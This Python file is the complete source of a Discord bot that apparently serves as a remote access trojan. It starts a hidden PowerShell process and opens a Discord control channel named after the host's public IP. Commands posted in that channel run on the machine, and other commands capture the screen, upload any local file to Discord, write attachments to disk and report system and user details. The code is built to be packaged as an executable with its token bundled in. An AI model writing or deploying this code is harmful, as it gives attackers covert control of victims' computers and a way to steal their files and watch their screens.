import discord
from discord.ext import commands
import subprocess
import requests
import os
import pyautogui
from io import BytesIO
import asyncio
import sys
import time
from datetime import datetime
from dotenv import load_dotenv
import atexit
import platform
import psutil


KEYBOARD_AVAILABLE = False
try:
    import keyboard as kb
    KEYBOARD_AVAILABLE = True
except ImportError:
    pass


def load_environment():
    """Load .env file, works both as script and frozen executable."""
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(__file__)
    env_path = os.path.join(base_path, ".env")
    load_dotenv(env_path)

load_environment()

TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    print("Error: DISCORD_TOKEN not found in .env file")
    sys.exit(1)

# Configuration
DOWNLOAD_FOLDER = "C:/DiscordDownloads"
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Global state
target_channel = None
ps_process = None


async def execute_cmd(command: str) -> str:
    """Execute PowerShell command with timeout protection."""
    global ps_process
    if ps_process is None or ps_process.poll() is not None:
        return "PowerShell process is not active"

    marker = "__CMD_DONE__"
    wrapper = f"""
try {{
    {command}
}} catch {{
    Write-Output "$($_.Exception.Message)"
}}
Write-Output "{marker}"
"""

    try:
        ps_process.stdin.write(wrapper + "\n")
        ps_process.stdin.flush()
    except Exception as e:
        return f"Failed to send command: {str(e)}"

    output = []
    timeout_seconds = 30

    try:
        async with asyncio.timeout(timeout_seconds):
            while True:
                line = await asyncio.get_running_loop().run_in_executor(
                    None, ps_process.stdout.readline
                )
                if not line:
                    break
                line = line.rstrip()
                if marker in line:
                    break
                if line:
                    output.append(line)
        return "\n".join(output) or "(no output)"
    except asyncio.TimeoutError:
        return f"[TIMEOUT after {timeout_seconds}s] Command may still be running"
    except Exception as e:
        return f"Execution error: {str(e)}"


@bot.event
async def on_ready():
    """Initialize bot and create control channel."""
    global target_channel, ps_process
    print(f"Bot logged in as {bot.user} (ID: {bot.user.id})")

    # Start persistent PowerShell process (hidden)
    try:
        ps_process = subprocess.Popen(
            ['powershell', '-NoLogo', '-NoExit', '-Command', '-'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )
        print("PowerShell process started")
    except Exception as e:
        print(f"Failed to start PowerShell: {e}")
        ps_process = None

    # Get public IP
    ip = "unknown"
    try:
        ip = requests.get('https://api.ipify.org', timeout=8).text.replace('.', '-')
    except:
        pass

 
    if not bot.guilds:
        print("No guilds found")
        return

    guild = bot.guilds[0]
    existing = [c for c in guild.text_channels if c.name.startswith("control-")]
    if existing:
        target_channel = existing[0]
        print(f"Reusing control channel: {target_channel.name}")
    else:
        try:
            target_channel = await guild.create_text_channel(f"control-{ip}")
            print(f"Created control channel: {target_channel.name}")
        except discord.Forbidden:
            print("Missing permissions to create channel")
            return
        except Exception as e:
            print(f"Channel creation failed: {e}")
            return


    startup = (
        f"Control channel: {target_channel.mention}\n"
        f"Bot ID: {bot.user.id}\n"
        f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        "Available commands:\n"
        "- PowerShell commands (type directly, no prefix)\n"
        "- !commands     Show command list\n"
        "- !load         Save attachments\n"
        "- !download <path>  Upload file\n"
        "- !screenshot   Capture screen\n"
        "- !sysinfo      Show system information"
    )
    await target_channel.send(f"```\nService online and ready\n\n{startup}\n```")


@bot.command(name='commands')
async def show_commands(ctx):
    """Display list of available commands (updated with !sysinfo)."""
    commands_text = (
        "Available commands:\n\n"
        "!commands          - Show this list\n"
        "!screenshot        - Capture and upload screenshot\n"
        "!load [folder]     - Save message attachments to disk\n"
        "!download <path>   - Upload file from disk\n"
        "!sysinfo           - Show system information (OS, CPU, RAM, etc.)\n\n"
        "PowerShell:\n"
        "Type any command directly in the control channel (no prefix)"
    )
    
    embed = discord.Embed(title="Command List", description=commands_text, color=0x7289DA)
    await ctx.send(embed=embed)


@bot.command(name='sysinfo')
async def system_info(ctx):
    """Display basic system information."""
    try:
        info = [
            f"OS: {platform.system()} {platform.release()}",
            f"Node: {platform.node()}",
            f"User: {os.getlogin()}",
            f"CPU cores: {psutil.cpu_count(logical=False)}",
            f"CPU usage: {psutil.cpu_percent()}%",
            f"RAM total: {psutil.virtual_memory().total / (1024**3):.1f} GB",
            f"RAM used: {psutil.virtual_memory().percent}%"
        ]
        await ctx.send("System Information:\n" + "\n".join(info))
    except Exception as e:
        await ctx.send(f"Error retrieving system info: {str(e)}")


@bot.command(name='load')
async def load_attachments(ctx, folder: str = DOWNLOAD_FOLDER):
    """Save all message attachments to the specified folder."""
    if not ctx.message.attachments:
        await ctx.send("No attachments in this message.")
        return

    os.makedirs(folder, exist_ok=True)
    saved = []

    for att in ctx.message.attachments:
        path = os.path.join(folder, att.filename)
        try:
            await att.save(path)
            saved.append(att.filename)
        except Exception as e:
            await ctx.send(f"Failed to save {att.filename}: {e}")
            return

    await ctx.send(f"Saved {len(saved)} file(s) to `{folder}`:\n" + "\n".join(saved))


@bot.command(name='screenshot')
async def take_screenshot(ctx):
    """Capture and upload a screenshot."""
    try:
        img = pyautogui.screenshot()
        bio = BytesIO()
        img.save(bio, format='PNG')
        bio.seek(0)

        file = discord.File(bio, filename=f"screenshot_{int(time.time())}.png")
        await ctx.send("Screenshot captured:", file=file)
    except Exception as e:
        await ctx.send(f"Screenshot failed: {e}")


@bot.command(name='download')
async def upload_file(ctx, *, file_path: str):
    """Upload a file from the local disk."""
    file_path = file_path.strip('"\'')
    if not os.path.isfile(file_path):
        await ctx.send("File not found or is a directory.")
        return

    size_mb = os.path.getsize(file_path) / (1024 * 1024)
    if size_mb > 25:
        await ctx.send(f"File too large ({size_mb:.1f} MB). Discord limit: 25 MB.")
        return

    try:
        file = discord.File(file_path, filename=os.path.basename(file_path))
        await ctx.send(f"File uploaded: {os.path.basename(file_path)}", file=file)
    except Exception as e:
        await ctx.send(f"Upload failed: {e}")


@bot.event
async def on_message(message):
    """Handle incoming messages."""
    if message.author.bot:
        return

    global target_channel

    if message.content.startswith(bot.command_prefix):
        await bot.process_commands(message)
        return

    if target_channel and message.channel.id == target_channel.id:
        if message.content.strip():
            result = await execute_cmd(message.content)
            if result:
                chunks = [result[i:i+1990] for i in range(0, len(result), 1990)]
                for chunk in chunks:
                    await message.channel.send(f"```powershell\n{chunk}\n```")
            else:
                await message.channel.send("```(no output)```")

    await bot.process_commands(message)


@atexit.register
def cleanup():
    """Cleanup resources on exit."""
    global ps_process
    if ps_process and ps_process.poll() is None:
        ps_process.terminate()
        print("PowerShell process terminated")
    print("Bot shutdown complete")


if __name__ == "__main__":
    print("Starting bot...")
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("Invalid token - check .env file")
    except KeyboardInterrupt:
        print("Bot stopped by user")
    except Exception as e:
        print(f"Fatal error: {e}")